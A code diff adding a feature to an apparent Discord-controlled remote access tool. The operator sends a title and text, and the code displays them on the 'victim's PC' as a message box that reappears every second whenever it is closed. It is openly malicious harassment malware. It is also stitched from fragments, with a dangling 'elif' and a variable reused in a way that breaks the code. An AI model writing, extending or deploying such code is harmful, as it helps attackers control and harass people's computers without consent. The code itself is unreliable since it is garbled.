@@ -1,0 +1,60 @@
+import pyautogui
+import time
+import ctypes
+def display_pinned_text(title, message):
+    # Create a full-screen overlay with the text
+    response = ctypes.windll.user32.MessageBoxW(0, message, title, 0)
+    # Continuously check if the overlay window is closed, and recreate it if closed
+    while True:
+        current_windows = pyautogui.getAllTitles()
+        if title not in current_windows:
+            response = ctypes.windll.user32.MessageBoxW(0, message, title, 0)
+        # Check every second
+        time.sleep(1)
+# anywhere
+def send_custom_message(title, text, style):
+    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
+    possible_responses = [
+        '',
+        'OK',
+        'Cancel',
+        'Abort',
+        'Retry',
+        'Ignore',
+        'Yes',
+        'No',
+        '',
+        '',
+        'Try Again',
+        'Continue'
+    ]
+    print(f'The response for Message(title="{title}", text="{text}", style={style})\nis: {possible_responses[int(response)]}')
+# on message
+elif message.content == '.pinned-error':
+    await message.delete()
+    await message.channel.send("Please send the pinned message that you want to display onto the victim's PC in this order: Title=\"\", Message=\"\".")
+elif 'Title="' in message.content and 'Message="' in message.content:
+    # Extract title and message
+    start_title = message.content.find('Title="') + len('Title="')
+    end_title = message.content.find('"', start_title)
+    title = message.content[start_title:end_title]
+    start_message = message.content.find('Message="') + len('Message="')
+    end_message = message.content.find('"', start_message)
+    message = message.content[start_message:end_message]
+    # Ask for confirmation
+    confirmation_message = await message.channel.send(f'Are you sure you want to display the following to the victim\'s PC?\nTitle: {title}\nMessage: {message}\nPlease note that the message cannot be stopped until the victim shuts down the PC or ends the process.\nIf you wish to continue, react with: ✅ If not, react with 🔴.')
+    # Add reactions
+    await confirmation_message.add_reaction('✅')
+    await confirmation_message.add_reaction('🔴')
+    def check(reaction, user):
+        return user == message.author and str(reaction.emoji) in ['✅', '🔴'] and reaction.message.id == confirmation_message.id
+    try:
+        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
+    except asyncio.TimeoutError:
+        await message.channel.send('Confirmation timed out.')
+    else:
+        if str(reaction.emoji) == '✅':
+            # Display pinned text
+            display_pinned_text(title, message)
+        else:
+            await message.channel.send('Process cancelled.')
